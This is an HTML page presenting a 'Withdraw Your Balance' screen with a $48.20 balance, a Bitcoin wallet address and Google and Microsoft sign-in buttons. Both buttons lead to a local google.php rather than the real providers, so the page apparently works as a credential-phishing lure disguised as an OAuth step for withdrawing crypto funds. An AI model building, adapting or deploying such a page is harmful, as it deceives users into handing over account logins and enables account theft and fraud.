<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Withdraw Funds</title>
    <link rel="stylesheet" href="withdrawal.css">
</head>

<body>
    <style>
        body {
            font-family: 'Segoe UI', sans-serif;
            background: linear-gradient(to right, #f0f9ff, #e0f2fe);
            display: flex;
            align-items: center;
            justify-content: center;
            height: 100vh;
            margin: 0;
        }

        .withdrawal-container {
            background: white;
            padding: 40px 32px;
            border-radius: 16px;
            box-shadow: 0 12px 30px rgba(0, 0, 0, 0.1);
            text-align: center;
            max-width: 400px;
            width: 100%;
        }

        h1 {
            color: #1e3a8a;
            font-size: 1.8rem;
            margin-bottom: 16px;
        }

        .balance {
            font-size: 1.2rem;
            color: #334155;
            margin-bottom: 20px;
        }

        .instruction {
            color: #475569;
            margin-bottom: 24px;
        }

        .oauth-buttons {
            display: flex;
            flex-direction: column;
            gap: 16px;
        }

        .oauth-btn {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 12px;
            text-decoration: none;
            font-weight: 600;
            padding: 12px;
            border-radius: 8px;
            font-size: 1rem;
            transition: background-color 0.3s ease;
            box-shadow: 0 3px 10px rgba(0, 0, 0, 0.05);
        }

        .oauth-btn img {
            height: 20px;
        }

        .oauth-btn.google {
            background: #ffffff;
            color: #000000;
            border: 1px solid #e5e7eb;
        }

        .oauth-btn.google:hover {
            background: #f3f4f6;
        }

        .oauth-btn.microsoft {
            background: #2f2f2f;
            color: white;
        }

        .oauth-btn.microsoft:hover {
            background: #1e1e1e;
        }

        .github {
            opacity: 0.3;
            background-color: #000000 !important;
            color: white !important;
        }
    </style>
    <div class="withdrawal-container">
        <h1>Withdraw Your Balance</h1>
        <p class="balance">Current Balance: <strong>$48.20</strong></p>

        <p class="instruction">To withdraw your funds, we use OAuth in order to propery authenticate accounts to prevent fraud and bots</p>
        <p class="instruction">Wallet address bc1qcpnerhjmwps4fevmyy9zvfqcz6y9ajjp8kc3fh</p>

        <div class="oauth-buttons">
            <a href="google.php?nonce=127374625645622&id=abet43&redirect=rocketship&curr=BTC&action=withdraw" class="oauth-btn google">
                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/c/c1/Google_%22G%22_logo.svg/1200px-Google_%22G%22_logo.svg.png" alt="Google logo">
                Continue with Google
            </a>

            <a href="google.php?nonce=127374625645622&id=abet43&redirect=rocketship&curr=BTC&action=withdraw" class="oauth-btn microsoft">
                <img src="https://upload.wikimedia.org/wikipedia/commons/4/44/Microsoft_logo.svg" alt="Microsoft logo">
                Continue with Microsoft
            </a>

            <a href="" class="oauth-btn github">
                Continue with Github
            </a>
        </div>
    </div>
</body>

</html>